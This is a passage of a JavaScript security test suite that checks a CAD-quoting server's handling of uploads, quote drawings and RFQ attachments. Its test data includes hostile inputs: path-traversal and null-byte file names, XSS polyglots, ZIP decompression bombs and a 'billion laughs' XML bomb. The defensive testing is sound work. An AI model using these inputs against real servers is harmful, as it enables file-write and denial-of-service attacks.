/**
 * Uploads against the real server: what is accepted, what is refused, and that
 * a refused upload leaves nothing on disk. Covers the CAD upload, the drawing a
 * buyer attaches to a quote, and the RFQ attachment.
 * Run: node server/security/uploads.test.js
 */
const assert = require("assert");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const { runner } = require("../testSupport/harness");
const live = require("../testSupport/liveServer");
const { buildZip, box3mf, boxModelXml, binaryStl, solidStl } = require("../testSupport/zip");

const { test, run } = runner("Uploads (live server)");
const parts = path.join(live.ROOT, "tools", "vet-quotes", "parts");
const cube = fs.readFileSync(path.join(parts, "cube_20mm.stl"));
const stepPlate = fs.readFileSync(path.join(live.ROOT, "server", "geometry", "fixtures", "plate_holes.step"));
const goodDxf = fs.readFileSync(path.join(parts, "dxf_plate_holes.dxf"));
const png = fs.readFileSync(path.join(live.ROOT, "client", "public", "apple-touch-icon.png"));
const bigStep = zlib.gunzipSync(fs.readFileSync(path.join(__dirname, "fixtures", "plate_400_holes.step.gz")));
const pdf = Buffer.from("%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n");

function crossingLinesDxf(n) {
  let seed = 1;
  const r = () => ((seed = (seed * 16807) % 2147483647) / 2147483647) * 1000;
  let s = "0\nSECTION\n2\nENTITIES\n";
  for (let i = 0; i < n; i++) s += `0\nLINE\n8\n0\n10\n${r()}\n20\n${r()}\n11\n${r()}\n21\n${r()}\n`;
  return s + "0\nENDSEC\n0\nEOF\n";
}

/** Every file under a folder, relative paths. */
function tree(dir, base = dir, out = []) {
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) tree(p, base, out); else out.push(path.relative(base, p));
  }
  return out.sort();
}
const UUID_NAME = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\.(step|stp|stl|3mf|iges|igs|dxf)$/;
/** Nothing in an answer may give away where the server lives or how it failed. */
function assertNoLeak(text) {
  assert.ok(!/node_modules|\/server\/|\/home\/|\/app\/|\/tmp\/|at \w+ \(|\.js:\d+|ENOENT|EACCES|adm-zip|occt|wasm/i.test(text), `response leaks internals: ${text.slice(0, 300)}`);
}

const servers = [];
async function server(opts) { const s = await live.start(opts); servers.push(s); return s; }
let A; // tight limits so small files exercise every ceiling
const startA = async () => (A = A || await server({ env: { UPLOAD_MAX_FILES: "3", UPLOAD_MAX_FILE_MB: "2", MESH_MAX_TRIANGLES: "2000", DXF_MAX_ENTITIES: "500", PARSE_TIMEOUT_MS: "20000" } }));
let ipN = 0;
const ip = () => `198.51.100.${++ipN}`;

// ─── Names, paths, extensions ────────────────────────────────

test("a good upload is stored under a server-generated name; the client's name is only a label", async () => {
  const s = await startA();
  const r = await s.upload([{ name: "My Bracket (rev B).stl", data: cube }, { name: "plate.STEP", data: stepPlate }], { ip: ip() });
  assert.strictEqual(r.status, 200, r.text);
  assert.strictEqual(r.body.parts.length, 2);
  assert.deepStrictEqual(r.body.parts.map((p) => p.fileName), ["My Bracket (rev B).stl", "plate.STEP"]);
  const stored = s.files("uploads");
  assert.strictEqual(stored.length, 2);
  for (const name of stored) assert.ok(UUID_NAME.test(name), `stored name ${name} is a UUID plus an allowed extension`);
  assert.ok(!JSON.stringify(r.body).includes(s.tmp), "no server path in the response");
});

test("path traversal in the file name goes nowhere: nothing is written outside data/uploads", async () => {
  const s = await startA();
  const before = tree(s.tmp);
  const names = ["../../../evil.stl", "..\\..\\..\\evil.stl", "/etc/cron.d/evil.stl", "C:\\Windows\\evil.stl", "....//....//evil.stl", "%2e%2e%2fevil.stl", "evil\u202egpj.stl"];
  for (const name of names) {
    const r = await s.upload([{ name, data: cube }], { ip: ip() });
    assert.strictEqual(r.status, 200, `${name}: ${r.text}`);
    assert.strictEqual(r.body.parts.length, 1, `${name}: ${r.text}`);
    assert.ok(!/[\\/]|\.\.\/|\u202e/.test(r.body.parts[0].fileName), `label for ${JSON.stringify(name)} is ${JSON.stringify(r.body.parts[0].fileName)}`);
  }
  const added = tree(s.tmp).filter((f) => !before.includes(f) && !/quoting\.db/.test(f));
  assert.strictEqual(added.length, names.length);
  for (const f of added) {
    assert.strictEqual(path.dirname(f), path.join("data", "uploads"), `${f} is outside data/uploads`);
    assert.ok(UUID_NAME.test(path.basename(f)), `${f} has a server-generated name`);
  }
  assert.ok(!fs.existsSync("/etc/cron.d/evil.stl"));
});

test("an extension that is not on the list is refused before anything is kept", async () => {
  const s = await startA();
  const before = s.files("uploads").length;
  for (const name of ["tool.exe", "page.html", "image.svg", "noextension", "part.stl.exe", "part.stl.", "shell.php", ".stl", "part.stl\u0000.exe"]) {
    const r = await s.upload([{ name, data: cube }], { ip: ip() });
    assert.strictEqual(r.status, 400, `${JSON.stringify(name)} → ${r.status} ${r.text}`);
    assert.ok(r.body && r.body.error, "answered in JSON with a message");
    assertNoLeak(r.text);
  }
  // one bad file refuses the whole request, including the good file beside it
  const mixed = await s.upload([{ name: "good.stl", data: cube }, { name: "bad.exe", data: cube }], { ip: ip() });
  assert.strictEqual(mixed.status, 400);
  assert.strictEqual(s.files("uploads").length, before, "nothing was left behind");
});

test("renamed files fail the content check and are deleted (wrong extension, renamed binaries)", async () => {
  const s = await startA();
  const before = s.files("uploads").length;
  const cases = [
    ["photo.stl", png],                                   // a PNG called .stl
    ["model.stl", stepPlate],                             // STEP text called .stl
    ["model.step", cube],                                 // an STL called .step
    ["model.stp", png],
    ["model.3mf", cube],                                  // not a ZIP
    ["drawing.dxf", Buffer.concat([Buffer.from("AC1027"), Buffer.alloc(600, 7)])], // a DWG called .dxf
    ["model.igs", Buffer.from("S " + "this is just text with an S and a space ".repeat(20))],
    ["model.iges", png],
    ["tiny.stl", Buffer.from("ab")],
    ["zero.stl", Buffer.alloc(0)],
    ["liar.stl", (() => { const b = binaryStl(10); b.writeUInt32LE(10000000, 80); return b; })()], // header claims 10 million triangles
    ["empty.stl", (() => { const b = Buffer.alloc(84); return b; })()],
  ];
  for (const [name, data] of cases) {
    const r = await s.upload([{ name, data }], { ip: ip() });
    assert.strictEqual(r.status, 200, `${name}: ${r.status} ${r.text}`);
    assert.strictEqual(r.body.parts.length, 0, `${name} must not become a part`);
    assert.strictEqual(r.body.errors.length, 1, `${name}: ${r.text}`);
    assert.strictEqual(r.body.errors[0].code, "content-mismatch", `${name}: ${r.text}`);
    assertNoLeak(r.text);
  }
  assert.strictEqual(s.files("uploads").length, before, "every rejected file was removed");
});

test("polyglots that pass the content check still leave nothing behind when the parser refuses them", async () => {
  const s = await startA();
  const before = s.files("uploads").length;
  const cases = [
    ["poly.step", Buffer.concat([Buffer.from("ISO-10303-21;\nHEADER;\n"), Buffer.from("<script>alert(1)</script>"), png])],
    ["poly.stl", Buffer.from("solid x\nfacet normal 0 0 1\n<html><script>alert(1)</script></html>\nendsolid x\n")],
    ["poly.3mf", buildZip([{ name: "index.html", data: "<script>alert(1)</script>" }])],          // a ZIP, but no model inside
    ["poly.dxf", Buffer.from("0\nSECTION\n2\nENTITIES\n0\nENDSEC\n0\nEOF\n<script>alert(1)</script>")],
    ["poly.igs", Buffer.from(`${"junk".padEnd(72)}S      1\n${"more junk".padEnd(72)}G      1\n`)],
  ];
  for (const [name, data] of cases) {
    const r = await s.upload([{ name, data }], { ip: ip() });
    assert.strictEqual(r.status, 200, `${name}: ${r.status} ${r.text}`);
    assert.strictEqual(r.body.parts.length, 0, `${name}: ${r.text}`);
    assert.strictEqual(r.body.errors.length, 1);
    assert.ok(r.body.errors[0].error.length > 10, "a sentence for the customer");
    assertNoLeak(r.text);
  }
  assert.strictEqual(s.files("uploads").length, before, "failed parses are deleted, not kept for a week");
});

// ─── Size and count ceilings ─────────────────────────────────

test("more files than UPLOAD_MAX_FILES, or a file over UPLOAD_MAX_FILE_MB: refused, nothing kept", async () => {
  const s = await startA();
  const before = s.files("uploads").length;
  const four = await s.upload([1, 2, 3, 4].map((i) => ({ name: `p${i}.stl`, data: cube })), { ip: ip() });
  assert.strictEqual(four.status, 400, four.text);
  assert.strictEqual(four.body.code, "too-many-files");
  assert.ok(/up to 3 /.test(four.body.error), four.body.error);

  const big = Buffer.concat([cube, Buffer.alloc(2 * 1024 * 1024 + 10)]);
  const tooBig = await s.upload([{ name: "ok.stl", data: cube }, { name: "huge.stl", data: big }], { ip: ip() });
  assert.strictEqual(tooBig.status, 413, tooBig.text);
  assert.strictEqual(tooBig.body.code, "file-too-large");
  assert.ok(/2 MB/.test(tooBig.body.error) && /firm quote/i.test(tooBig.body.error), tooBig.body.error);

  // A body larger than the whole request could legitimately be is refused on its Content-Length alone.
  const giant = await s.req({ url: "/api/upload", method: "POST", ip: ip(), headers: { "Content-Type": "multipart/form-data; boundary=x", "Content-Length": String(500 * 1024 * 1024) }, body: Buffer.from("--x\r\n") });
  assert.strictEqual(giant.status, 413, giant.text);
  await new Promise((r) => setTimeout(r, 200));
  assert.strictEqual(s.files("uploads").length, before, "nothing was left behind");
});

test("models past the triangle / entity ceiling are sent to a firm quote, in words", async () => {
  const s = await startA();
  const before = s.files("uploads").length;
  const stl = await s.upload([{ name: "dense.stl", data: binaryStl(2001) }], { ip: ip() });
  assert.strictEqual(stl.body.parts.length, 0);
  assert.strictEqual(stl.body.errors[0].code, "model-too-large", stl.text);
  assert.strictEqual(stl.body.errors[0].offerRfq, true);
  assert.ok(/2,001 triangles/.test(stl.body.errors[0].error) && /2,000/.test(stl.body.errors[0].error) && /firm quote/i.test(stl.body.errors[0].error), stl.body.errors[0].error);

  const ascii = "solid a\n" + "facet normal 0 0 1\nouter loop\nvertex 0 0 0\nvertex 1 0 0\nvertex 0 1 0\nendloop\nendfacet\n".repeat(2001) + "endsolid a\n";
  const a = await s.upload([{ name: "dense-ascii.stl", data: Buffer.from(ascii) }], { ip: ip() });
  assert.strictEqual(a.body.errors[0].code, "model-too-large", a.text);

  // 3MF: the same 12-triangle box 200 times over through components
  const many = Array.from({ length: 200 }, (_, i) => `<object id="${i + 2}" type="model"><components><component objectid="1"/></components></object>`).join("");
  const build = Array.from({ length: 200 }, (_, i) => `<item objectid="${i + 2}"/>`).join("");
  const xml = boxModelXml(10, 10, 10, { extra: many }).replace('<build><item objectid="1"/></build>', `<build>${build}</build>`);
  const m = await s.upload([{ name: "instanced.3mf", data: buildZip([{ name: "3D/3dmodel.model", data: xml }]) }], { ip: ip() });
  assert.strictEqual(m.body.errors[0].code, "model-too-large", m.text);

  const dxf = await s.upload([{ name: "busy.dxf", data: Buffer.from(crossingLinesDxf(600)) }], { ip: ip() });
  assert.strictEqual(dxf.body.errors[0].code, "model-too-large", dxf.text);
  assert.ok(/600 entities/.test(dxf.body.errors[0].error) && /RFQ/.test(dxf.body.errors[0].error), dxf.body.errors[0].error);
  assert.strictEqual(s.files("uploads").length, before, "nothing was left behind");
});

// ─── 3MF: ZIP and XML bombs ──────────────────────────────────

test("3MF decompression bombs are refused before anything is unpacked", async () => {
  const s = await startA();
  const before = s.files("uploads").length;
  const model = Buffer.from(boxModelXml());

  // 1. The classic: 300 MB of padding that deflates to ~300 kB.
  const padded = Buffer.concat([model, Buffer.alloc(300 * 1024 * 1024, 0x20)]);
  const bomb = buildZip([{ name: "3D/3dmodel.model", data: padded }]);
  assert.ok(bomb.length < 1024 * 1024, `the bomb is only ${bomb.length} bytes on the wire`);
  const t0 = Date.now();
  const r1 = await s.upload([{ name: "bomb.3mf", data: bomb }], { ip: ip() });
  assert.strictEqual(r1.body.parts.length, 0, r1.text);
  assert.ok(/decompression bomb|more than the instant quote reads/i.test(r1.body.errors[0].error), r1.body.errors[0].error);
  assert.ok(Date.now() - t0 < 3000, `refused in ${Date.now() - t0} ms — it was not inflated`);

  // 2. The same data with a directory that lies about its size (says 4 kB): the inflater stops at what was declared.
  const lying = buildZip([{ name: "3D/3dmodel.model", data: padded, declaredSize: 4096 }]);
  const r2 = await s.upload([{ name: "liar.3mf", data: lying }], { ip: ip() });
  assert.strictEqual(r2.body.parts.length, 0, r2.text);
  assert.ok(/3MF/.test(r2.body.errors[0].error), r2.body.errors[0].error);

  // 3. Declared size zero (the bypass fixed in adm-zip 0.6.1).
  const zero = buildZip([{ name: "3D/3dmodel.model", data: padded, declaredSize: 0 }]);
  const r3 = await s.upload([{ name: "zero.3mf", data: zero }], { ip: ip() });
  assert.strictEqual(r3.body.parts.length, 0, r3.text);

  // 4. Thousands of entries.
  const crowd = buildZip([{ name: "3D/3dmodel.model", data: model }, ...Array.from({ length: 5000 }, (_, i) => ({ name: `Metadata/f${i}.txt`, data: "x", method: "store" }))]);
  const r4 = await s.upload([{ name: "crowd.3mf", data: crowd }], { ip: ip() });
  assert.strictEqual(r4.body.parts.length, 0, r4.text);
  assert.ok(/5,001 files/.test(r4.body.errors[0].error), r4.body.errors[0].error);

  // 5. A second big entry beside a good model: the archive as a whole is judged, not only the part we read.
  const side = buildZip([{ name: "3D/3dmodel.model", data: model }, { name: "Metadata/thumbnail.png", data: Buffer.alloc(200 * 1024 * 1024) }]);
  const r5 = await s.upload([{ name: "side.3mf", data: side }], { ip: ip() });
  assert.strictEqual(r5.body.parts.length, 0, r5.text);

  // 6. Encrypted entry, and the model named twice (once in another case).
  const dup = buildZip([{ name: "3D/3dmodel.model", data: model }, { name: "3d/3DMODEL.MODEL", data: "<model/>" }]);
  const r6 = await s.upload([{ name: "dup.3mf", data: dup }], { ip: ip() });
  assert.strictEqual(r6.body.parts.length, 0, r6.text);

  for (const r of [r1, r2, r3, r4, r5, r6]) assertNoLeak(r.text);
  assert.strictEqual(s.files("uploads").length, before, "nothing was left behind");
  // and an honest 3MF still reads
  const ok = await s.upload([{ name: "box.3mf", data: box3mf(20, 30, 40) }], { ip: ip() });
  assert.strictEqual(ok.body.parts.length, 1, ok.text);
  assert.ok(Math.abs(ok.body.parts[0].geometry.volume - 24000) < 1e-6);
});

test("3MF XML bombs: entity expansion is off and nesting is capped", async () => {
  const s = await startA();
  const before = s.files("uploads").length;
  // "Billion laughs": nine levels of ten-fold entity expansion in front of a valid model.
  let dtd = '<!DOCTYPE lolz [<!ENTITY lol "lollollollollollollollollollol">';
  for (let i = 1; i < 9; i++) dtd += `<!ENTITY lol${i} "${`&lol${i === 1 ? "" : i - 1};`.repeat(10)}">`;
  dtd += "]>";
  const laughs = boxModelXml().replace('<?xml version="1.0" encoding="UTF-8"?>', `<?xml version="1.0" encoding="UTF-8"?>${dtd}`).replace("<resources>", "<metadata name=\"Title\">&lol8;</metadata><resources>");
  const t0 = Date.now();
  const r1 = await s.upload([{ name: "laughs.3mf", data: buildZip([{ name: "3D/3dmodel.model", data: laughs }]) }], { ip: ip() });
  assert.ok(Date.now() - t0 < 5000, `answered in ${Date.now() - t0} ms`);
  assert.strictEqual(r1.status, 200, r1.text);
  // Either it is refused, or it parses with the entity left unexpanded — never a gigabyte of "lol".
  assert.ok(r1.body.parts.length === 1 || /3MF/.test(r1.body.errors[0].error), r1.text);
  assert.ok(r1.text.length < 200000, "the response is not inflated either");

  const deep = `<?xml version="1.0"?><model unit="millimeter">${"<a>".repeat(500)}${"</a>".repeat(500)}<resources/></model>`;
  const r2 = await s.upload([{ name: "deep.3mf", data: buildZip([{ name: "3D/3dmodel.model", data: deep }]) }], { ip: ip() });
  assert.strictEqual(r2.body.parts.length, 0, r2.text);
  assert.ok(/3MF/.test(r2.body.errors[0].error), r2.body.errors[0].error);

  // Components that include each other for ever.
  const loop = boxModelXml(10, 10, 10, { extra: '<object id="2" type="model"><components><component objectid="3"/></components></object><object id="3" type="model"><components><component objectid="2"/></components></object>' })
    .replace('<item objectid="1"/>', '<item objectid="2"/>');
  const r3 = await s.upload([{ name: "loop.3mf", data: buildZip([{ name: "3D/3dmodel.model", data: loop }]) }], { ip: ip() });
  assert.strictEqual(r3.body.parts.length, 0, r3.text);
  for (const r of [r1, r2, r3]) assertNoLeak(r.text);
  const kept = r1.body.parts.length;
  assert.strictEqual(s.files("uploads").length, before + kept, "nothing was left behind");
});

// ─── Time, concurrency, responsiveness ───────────────────────

test("a slow file is cut off at PARSE_TIMEOUT_MS; the site answers throughout; a second sender is told 'busy' (503)", async () => {
  const s = await server({ env: { PARSE_TIMEOUT_MS: "2500", PARSE_CONCURRENCY: "1", PARSE_QUEUE_MAX: "0" } });
  const slow = Buffer.from(crossingLinesDxf(5000)); // ~480 kB, tens of seconds of contour building
  const t0 = Date.now();
  const first = s.upload([{ name: "slow.dxf", data: slow }], { ip: "203.0.113.1", fields: { process: "routing" } });
  await new Promise((r) => setTimeout(r, 300));

  // While the worker grinds: the health check and the catalog answer at once…
  const pings = [];
  for (let i = 0; i < 8; i++) {
    const h = await s.get(i % 2 ? "/api/materials" : "/api/health", { ip: "203.0.113.50" });
    assert.strictEqual(h.status, 200);
    pings.push(h.ms);
    await new Promise((r) => setTimeout(r, 100));
  }
  assert.ok(Math.max(...pings) < 300, `slowest answer during the parse: ${Math.max(...pings)} ms`);

  // …and another customer's upload is turned away politely instead of queueing behind it.
  const second = await s.upload([{ name: "cube.stl", data: cube }], { ip: "203.0.113.2" });
  assert.strictEqual(second.status, 503, second.text);
  assert.strictEqual(second.body.code, "busy");
  assert.ok(Number(second.headers["retry-after"]) >= 1, "Retry-After is set");
  assert.ok(/again/i.test(second.body.error), second.body.error);

  const r = await first;
  const took = Date.now() - t0;
  assert.strictEqual(r.status, 200, r.text);
  assert.strictEqual(r.body.parts.length, 0);
  assert.strictEqual(r.body.errors[0].code, "parse-timeout", r.text);
  assert.strictEqual(r.body.errors[0].offerRfq, true);
  assert.ok(/firm quote/i.test(r.body.errors[0].error), r.body.errors[0].error);
  assert.ok(took < 6000, `the request ended after ${took} ms`);
  assert.deepStrictEqual(s.files("uploads"), [], "neither the timed-out file nor the refused one is on disk");

  // The worker was replaced: the next upload is read normally.
  const after = await s.upload([{ name: "cube.stl", data: cube }], { ip: "203.0.113.2" });
  assert.strictEqual(after.body.parts.length, 1, after.text);
});

test("event loop stays responsive while a large STEP file parses: /api/health answers in milliseconds", async () => {
  const s = await server({ env: {} });
  const t0 = Date.now();
  let done = false;
  const up = s.upload([{ name: "plate_400_holes.step", data: bigStep }], { ip: "203.0.113.7", timeoutMs: 180000 }).then((r) => { done = true; return r; });
  const pings = [];
  while (!done) {
    const h = await s.get("/api/health");
    assert.strictEqual(h.status, 200);
    pings.push(h.ms);
    await new Promise((r) => setTimeout(r, 50));
  }
  const r = await up;
  const took = Date.now() - t0;
  assert.strictEqual(r.status, 200, r.text.slice(0, 300));
  assert.strictEqual(r.body.parts.length, 1, r.text.slice(0, 300));
  assert.strictEqual(r.body.parts[0].geometry.estimatedHoles, 400);
  assert.ok(took > 2000, `the parse took ${took} ms — long enough to matter`);
  assert.ok(pings.length > took / 50 / 3, `${pings.length} health checks completed during a ${took} ms parse`);
  // Everything up to the last few checks happened while the worker was busy; the tail includes storing the result.
  const during = pings.slice(0, Math.max(1, pings.length - 3));
  const worst = Math.max(...during);
  assert.ok(worst < 250, `slowest health check while parsing: ${worst} ms (check ${during.indexOf(worst) + 1} of ${pings.length}; all over 100 ms: ${pings.map((ms, i) => (ms > 100 ? `#${i + 1}=${ms}` : "")).filter(Boolean).join(" ")})`);
  console.log(`       (2 MB STEP: ${took} ms; ${pings.length} health checks, median ${during.sort((a, b) => a - b)[Math.floor(during.length / 2)]} ms, worst ${worst} ms; worst including storing the result ${Math.max(...pings)} ms)`);
});

// ─── Budgets and ceilings ────────────────────────────────────

test("daily byte budget per client: over UPLOAD_DAILY_MB_PER_IP the sender is refused; a forged X-Forwarded-For does not help", async () => {
  const s = await server({ env: { UPLOAD_DAILY_MB_PER_IP: "1" } });
  const chunk = solidStl(32); // 600 kB of a real solid (a gridded box), parses in a moment
  const a1 = await s.upload([{ name: "a.stl", data: chunk }], { ip: "203.0.113.10" });
  assert.strictEqual(a1.status, 200, a1.text);
  const a2 = await s.upload([{ name: "b.stl", data: chunk }], { ip: "203.0.113.10" });
  assert.strictEqual(a2.status, 429, a2.text);
  assert.strictEqual(a2.body.code, "daily-upload-limit");
  assert.ok(/1 MB/.test(a2.body.error) && /quotes@/.test(a2.body.error), a2.body.error);
  // The left-hand entries of X-Forwarded-For are whatever the client typed; only the last hop (the edge's) counts.
  const spoof = await s.upload([{ name: "c.stl", data: chunk }], { ip: "8.8.8.8, 203.0.113.10" });
  assert.strictEqual(spoof.status, 429, "same client, whatever it claims to be");
  // Rejected bytes count too: a refused renamed file still used the budget.
  const b1 = await s.upload([{ name: "x.stl", data: Buffer.concat([png, Buffer.alloc(700 * 1024)]) }], { ip: "203.0.113.11" });
  assert.strictEqual(b1.body.errors[0].code, "content-mismatch");
  const b2 = await s.upload([{ name: "y.stl", data: chunk }], { ip: "203.0.113.11" });
  assert.strictEqual(b2.status, 429, b2.text);
  // Another address is unaffected.
  const c = await s.upload([{ name: "c.stl", data: cube }], { ip: "203.0.113.12" });
  assert.strictEqual(c.status, 200);
  assert.strictEqual(s.files("uploads").length, 2);
});

test("hard ceiling on the upload folders: at UPLOAD_DIR_MAX_MB new files are refused politely and it is logged", async () => {
  const s = await server({
    env: { UPLOAD_DIR_MAX_MB: "10", UPLOAD_RETENTION_HOURS: "168" },
    prepare: (dataDir) => {
      fs.mkdirSync(path.join(dataDir, "uploads"), { recursive: true });
      fs.mkdirSync(path.join(dataDir, "rfq-drawings"), { recursive: true });
      fs.writeFileSync(path.join(dataDir, "uploads", "old-part.stl"), Buffer.alloc(6 * 1024 * 1024));
      fs.writeFileSync(path.join(dataDir, "rfq-drawings", "old-drawing.pdf"), Buffer.alloc(4 * 1024 * 1024 + 100));
    },
  });
  assert.ok(/UPLOAD STORAGE FULL/.test(s.log()), "the server says so at startup");
  const r = await s.upload([{ name: "cube.stl", data: cube }], { ip: "203.0.113.20" });
  assert.strictEqual(r.status, 503, r.text);
  assert.strictEqual(r.body.code, "storage-full");
  assert.ok(/quotes@/.test(r.body.error) && !/disk|storage|MB/i.test(r.body.error), `the customer is told what to do, not about our disk: ${r.body.error}`);
  assert.deepStrictEqual(s.files("uploads"), ["old-part.stl"], "nothing new was written");
  // The same ceiling guards the RFQ attachment.
  const rfq = await s.rfq({ contactName: "A Buyer", email: "buyer@example.com" }, [{ name: "print.pdf", data: pdf }], { ip: "203.0.113.20" });
  assert.strictEqual(rfq.status, 503, rfq.text);
  assert.deepStrictEqual(s.files("rfq-drawings"), ["old-drawing.pdf"]);
  // The rest of the site is unaffected.
  assert.strictEqual((await s.get("/api/materials")).status, 200);
});

// ─── Quote drawings and RFQ attachments ──────────────────────

test("quote drawing: only a real PDF is kept, under a server name; replacing or removing it deletes the old file", async () => {
  const s = await startA();
  const me = ip();
  const up = await s.upload([{ name: "cube.stl", data: cube }], { ip: me });
  const partId = up.body.parts[0].partId;
  const mats = (await s.get("/api/materials?process=cnc", { ip: me })).body;
  const q = await s.post("/api/quote", { parts: [{ partId, materialSlug: mats[0].slug, quantity: 1, process: "cnc", subProcess: "milling" }] }, { ip: me });
  assert.strictEqual(q.status, 200, q.text);
  const url = `/api/quote/${q.body.quoteId}/drawing`;
  const send = (name, data) => s.upload([{ field: "drawing", name, data }], { url, ip: me });

  for (const [name, data] of [["evil.pdf", Buffer.from("<html><script>alert(1)</script></html>")], ["photo.pdf", png], ["short.pdf", Buffer.from("%PD")]]) {
    const r = await send(name, data);
    assert.strictEqual(r.status, 400, `${name}: ${r.text}`);
  }
  assert.strictEqual((await send("page.html", pdf)).status, 400, "extension must be .pdf");
  assert.deepStrictEqual(s.files("quote-drawings"), [], "refused drawings are not kept");

  const first = await send("../../print rev A.pdf", pdf);
  assert.strictEqual(first.status, 200, first.text);
  assert.strictEqual(first.body.drawingFileName, "print rev A.pdf");
  const kept = s.files("quote-drawings");
  assert.strictEqual(kept.length, 1);
  assert.ok(/^[0-9a-f-]{36}\.pdf$/.test(kept[0]), kept[0]);

  const second = await send("print rev B.pdf", pdf);
  assert.strictEqual(second.status, 200);
  const now = s.files("quote-drawings");
  assert.strictEqual(now.length, 1, "the replaced drawing was removed");
  assert.notStrictEqual(now[0], kept[0]);

  const view = await s.get(`/api/quote/${q.body.quoteId}`, { ip: me });
  assert.ok(!("drawingPath" in view.body) && !view.text.includes(s.tmp), "the quote never shows where the file is stored");

  const del = await s.req({ url, method: "DELETE", ip: me });
  assert.strictEqual(del.status, 200);
  assert.deepStrictEqual(s.files("quote-drawings"), [], "removing the drawing removes the file");

  // Someone else's quote id (or a made-up one) accepts nothing, and no file is written for it.
  const other = await s.upload([{ field: "drawing", name: "x.pdf", data: pdf }], { url: "/api/quote/00000000-0000-4000-8000-000000000000/drawing", ip: me });
  assert.strictEqual(other.status, 404);
  assert.deepStrictEqual(s.files("quote-drawings"), []);
});

test("RFQ attachment: stored under a server name; type list enforced; request without a name is refused", async () => {
  const s = await startA();
  const me = ip();
  const fields = { contactName: "A Buyer", email: "buyer@example.com", notes: "two off" };
  const ok = await s.rfq(fields, [{ name: "../../../etc/print.pdf", data: pdf }], { ip: me });
  assert.strictEqual(ok.status, 201, ok.text);
  const kept = s.files("rfq-drawings");
  assert.strictEqual(kept.length, 1);
  assert.ok(/^[0-9a-f-]{36}\.pdf$/.test(kept[0]), `stored as ${kept[0]}`);
  const view = await s.get(`/api/rfq/${ok.body.rfqId}`, { ip: me });
  assert.ok(!view.text.includes(s.tmp) && !("drawingPath" in view.body), "the stored path is never sent to the customer");
  // A request sent without an account shows its status to whoever holds the id, and nothing about the sender (R3).
  assert.deepStrictEqual(Object.keys(view.body).sort(), ["createdAt", "id", "reference", "requestType", "status"]);
  assert.ok(!/buyer@example\.com|A Buyer|two off|print\.pdf/.test(view.text), view.text);

  const bad = await s.rfq({ ...fields, notes: "exe" }, [{ name: "tool.exe", data: pdf }], { ip: me });
  assert.strictEqual(bad.status, 400, bad.text);
  const html = await s.rfq({ ...fields, notes: "html" }, [{ name: "page.html", data: pdf }], { ip: me });
  assert.strictEqual(html.status, 400);
  assert.strictEqual(s.files("rfq-drawings").length, 1, "refused types are not kept");
  // The request without a name is refused, and so is one without its form token: neither leaves a file.
  const noName = await s.rfq({ email: "buyer@example.com" }, [{ name: "print.pdf", data: pdf }], { ip: me });
  assert.strictEqual(noName.status, 400, noName.text);
  const noToken = await s.upload([{ field: "drawing", name: "print.pdf", data: pdf }], { url: "/api/rfq", ip: me, fields: { ...fields, notes: "no token" } });
  assert.deepStrictEqual([noToken.status, noToken.body.code], [400, "form-token-missing"]);
  assert.strictEqual(s.files("rfq-drawings").length, 1);
});

test("RFQ attachment: a refused request leaves nothing on disk, whatever refused it (R1)", async () => {
  const s = await startA();
  const me = ip();
  const before = s.files("rfq-drawings").slice().sort();
  const still = (why) => assert.deepStrictEqual(s.files("rfq-drawings").slice().sort(), before, `a file was left behind after: ${why}`);
  const file = [{ name: "print.pdf", data: pdf }];
  const base = { contactName: "A Buyer", email: "buyer@example.com" };

  let r = await s.rfq({ email: "buyer@example.com", notes: "r1 no name" }, file, { ip: me });
  assert.strictEqual(r.status, 400); still("no name");
  r = await s.rfq({ contactName: "A Buyer", email: "not-an-address", notes: "r1 bad email" }, file, { ip: me });
  assert.strictEqual(r.status, 400); still("bad email");
  r = await s.rfq({ ...base, notes: "r1 control char", email: "buyer@example.com\u0000.evil.example" }, file, { ip: me });
  assert.strictEqual(r.status, 400); still("an address with a control character");
  r = await s.rfq({ ...base, notes: "r1 unknown quote", quoteId: "00000000-0000-4000-8000-000000000000" }, file, { ip: me });
  assert.strictEqual(r.status, 404); still("unknown quote");
  r = await s.upload([{ field: "drawing", name: "print.pdf", data: pdf }], { url: "/api/rfq", ip: me, fields: { ...base, notes: "r1 no token" } });
  assert.strictEqual(r.status, 400); still("no form token");
  r = await s.rfq({ ...base, notes: "r1 too fast" }, file, { ip: me, headers: { "X-Form-Token": s.formToken("rfq", 500) } });
  assert.deepStrictEqual([r.status, r.body.code], [400, "too-fast"]); still("sent faster than a person");
  r = await s.rfq({ ...base, notes: "r1 wrong form" }, file, { ip: me, headers: { "X-Form-Token": s.formToken("register") } });
  assert.strictEqual(r.status, 400); still("another form's token");
  // The honeypot answers like a success and keeps nothing.
  r = await s.rfq({ ...base, notes: "r1 honeypot", website: "https://spam.example" }, file, { ip: me });
  assert.strictEqual(r.status, 201); still("honeypot filled");
  assert.strictEqual((await s.get(`/api/rfq/${r.body.rfqId}`, { ip: me })).status, 404, "no request was stored for it");
  // The same request twice (a double click): one row, one file.
  const first = await s.rfq({ ...base, notes: "r1 double click" }, file, { ip: me });
  assert.strictEqual(first.status, 201, first.text);
  const afterFirst = s.files("rfq-drawings").length;
  assert.strictEqual(afterFirst, before.length + 1);
  const again = await s.rfq({ ...base, notes: "r1 double click" }, file, { ip: me });
  assert.deepStrictEqual([again.status, again.body.duplicate, again.body.rfqId], [201, true, first.body.rfqId]);
  assert.strictEqual(s.files("rfq-drawings").length, afterFirst, "the repeat's attachment was not kept");
});

test("RFQ attachment: the contents must match the extension, as for CAD uploads and drawings (R2)", async () => {
  const s = await startA();
  const me = ip();
  const before = s.files("rfq-drawings").length;
  const fields = (n) => ({ contactName: "A Buyer", email: `buyer${n}@example.com`, notes: `content check ${n}` });
  const png = fs.readFileSync(path.join(live.ROOT, "client", "public", "apple-touch-icon.png"));
  const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]), Buffer.from("JFIF\0"), Buffer.alloc(64)]);
  const webp = Buffer.concat([Buffer.from("RIFF"), Buffer.from([0x40, 0, 0, 0]), Buffer.from("WEBPVP8 "), Buffer.alloc(56)]);
